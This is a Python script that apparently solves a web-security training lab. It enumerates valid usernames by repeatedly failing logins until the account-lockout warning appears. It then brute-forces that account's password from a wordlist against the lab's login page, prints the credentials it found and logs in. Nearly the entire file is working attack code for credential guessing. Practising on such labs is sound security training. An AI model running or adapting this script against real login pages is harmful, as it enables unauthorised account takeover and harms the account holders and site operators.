import requests
# import sys
import time
from bs4 import BeautifulSoup


def attempt_username(username):
    logindata = {
        'username': username,
        'password': 'foo'
    }
    for i in range(6):
        resp = s.post(login_url, data=logindata)
    return resp


s = requests.session()

site = "ac2f1f341fe5a58280e18be200550064.web-security-academy.net"
login_url = f'''https://{site}/login'''

username_list = open("Authentication-lab-usernames.txt", "r").readlines()
password_list = open("Authentication-lab-passwords.txt", "r").readlines()

valid_username = ''
for username in username_list:
    target_username = username.strip()
    resp = attempt_username(target_username)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if 'You have made too many incorrect login attempts' in soup.find('p', {'class': 'is-warning'}).text:
        print(f'Valid username found: {target_username}')
        valid_username = target_username
        break

valid_password = ''
for password in password_list:
    target_password = password.strip()
    login_data = {
        'username': valid_username,
        'password': target_password
    }
    resp = s.post(login_url, data=login_data)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if not soup.find('p', {'class': 'is-warning'}):
        print(f'Valid password found: {target_password}')
        valid_password = target_password
        break


print(f'\nLog in with:\nUsername: {valid_username}\nPassword: {valid_password}\n')
time.sleep(60)
resp = s.post(login_url, data=login_data)
s.get(f'https://{site}/my-account?id={valid_username}')